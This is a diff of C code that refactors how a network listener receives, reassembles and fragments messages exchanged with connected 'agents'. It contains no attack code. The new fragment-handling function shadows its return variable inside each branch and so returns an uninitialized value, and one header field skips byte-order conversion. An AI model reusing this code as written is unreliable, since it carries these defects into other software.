@@ -106,7 +106,7 @@ STATIC int listener_handle_complete_message(Agent* agent){
 	
 	// check if we received all fragments
 	if (agent->last_header.index == -1 || agent->last_header.total_size != agent->current_message_size){
-		return RET_OK;
+		return ret_val;
 	}
 
 	// check if checksum matches message
@@ -121,14 +121,31 @@ STATIC int listener_handle_complete_message(Agent* agent){
 			break;
 		default:
 			printf("ERROR UNKNOWN MESSAGE TYPE: %d\n", agent->last_header.type);
-			return RET_ERROR;
+			ret_val = RET_ERROR;
 	}
+
+	// we are done processing message, reset agent index
+	agent->last_header.index = -1;
 
 	return ret_val;
 }
 
-STATIC int listener_handle_message_fragment(Connected_Agents* CA){
+STATIC int listener_handle_message_fragment(Agent* agent, Queue_Message* q_message){
 	int retval;
+
+	// handle message type other than keep alive
+	if (agent->last_header.index == -1){
+		int retval = listener_parse_first_fragment(agent, q_message->fragment, q_message->size);
+	}
+	else{
+		int retval = listener_parse_next_fragment(agent, q_message->fragment, q_message->size);
+	}
+
+	return retval;
+}
+
+STATIC int listener_handle_message(Connected_Agents* CA){
+	int retval = RET_OK;
 	Queue_Message* q_message;
 	Fragment* fragment;
 	Agent* agent;
@@ -136,11 +153,9 @@ STATIC int listener_handle_message_fragment(Connected_Agents* CA){
 	if (!(q_message = dequeue(listener_receive_queue, &listener_receive_queue_lock))) return RET_OK;
 	debug_print("taking message off queue: id: %d, size: %d\n", q_message->id, q_message->size);
 
-	fragment = q_message->fragment;
 	agent = &CA->agents[q_message->id];
 
 	pthread_mutex_lock(&CA->lock);
-
 	// check if socket file descriptor was removed from agents global variable
 	if (!agent->alive){
 		pthread_mutex_unlock(&CA->lock);
@@ -156,40 +171,24 @@ STATIC int listener_handle_message_fragment(Connected_Agents* CA){
 		return RET_OK;
 	}
 
-	// handle message type other than keep alive
-	if (CA->agents[q_message->id].last_header.index == -1){
-		int retval = listener_parse_first_fragment(&CA->agents[q_message->id], fragment, q_message->size);
+	retval = listener_handle_message_fragment(agent, q_message);
+	if (retval == RET_ORDER){
+		pthread_mutex_unlock(&CA->lock);
+		agent->last_header.index = -1;
+		return RET_OK;
 	}
-	else{
-		int retval = listener_parse_next_fragment(&CA->agents[q_message->id], fragment, q_message->size);
-	}
+	
+	retval = listener_handle_complete_message(agent);
 	pthread_mutex_unlock(&CA->lock);
 
 	return retval;
 }
 
-STATIC int listener_handle_message(Connected_Agents* CA){
-	int retval = RET_OK;
-
-	retval = listener_handle_message_fragment(CA);
-
-	if (retval == RET_ORDER){
-		return RET_OK;
-	}
-	
-	retval = listener_handle_complete_message(CA);
-
-	return retval;
-}
-
-
-// TODO check next_size math here
 int listener_prepare_message(int sockfd, int type, char* message, int message_size){
 	Queue_Message* q_message;
 	Fragment* fragment;
-	int bytes_sent = 0;
-	int this_size;
-	int index = 0;
+	int bytes_sent = 0, index = 0;
+	int this_size, next_size;
 
 	// prepare first fragment. Only purpose is to prepare for next fragment size
 	fragment = calloc(1, sizeof(Fragment));
@@ -198,7 +197,8 @@ int listener_prepare_message(int sockfd, int type, char* message, int message_si
 	fragment->header.total_size = htonl(message_size);
 	fragment->header.checksum = 0;							// TODO
 	
-	fragment->header.next_size = message_size < PAYLOAD_SIZE ? message_size : PAYLOAD_SIZE;
+	next_size = message_size < PAYLOAD_SIZE ? message_size : PAYLOAD_SIZE;
+	fragment->header.next_size = next_size;
 	
 	q_message = malloc(sizeof(Queue_Message));
 	q_message->id = sockfd;
@@ -207,8 +207,8 @@ int listener_prepare_message(int sockfd, int type, char* message, int message_si
 
 	enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
 	
-	while (fragment->header.next_size > 0){
-		this_size = fragment->header.next_size;
+	while (next_size > 0){
+		this_size = next_size;
 
 		// send remaining fragments
 		fragment = calloc(1, sizeof(Fragment));
@@ -216,14 +216,15 @@ int listener_prepare_message(int sockfd, int type, char* message, int message_si
 		fragment->header.index = htonl(index++);
 		fragment->header.total_size = htonl(message_size);
 		fragment->header.checksum = 0;							// TODO
+
+		next_size = (message_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (message_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
+		fragment->header.next_size = next_size;
+		memcpy(fragment->buffer, message + bytes_sent, this_size);
 		
 		q_message = malloc(sizeof(Queue_Message));
 		q_message->id = sockfd;
 		q_message->size = HEADER_SIZE + this_size;
 		q_message->fragment = fragment;
-		
-		fragment->header.next_size = (message_size - (bytes_sent + fragment->header.next_size)) < PAYLOAD_SIZE ? (message_size - (bytes_sent + fragment->header.next_size)) : PAYLOAD_SIZE;
-		memcpy(fragment->buffer, message + bytes_sent, this_size);
 
 		enqueue(listener_send_queue, &listener_send_queue_lock, q_message);
 		bytes_sent += this_size;
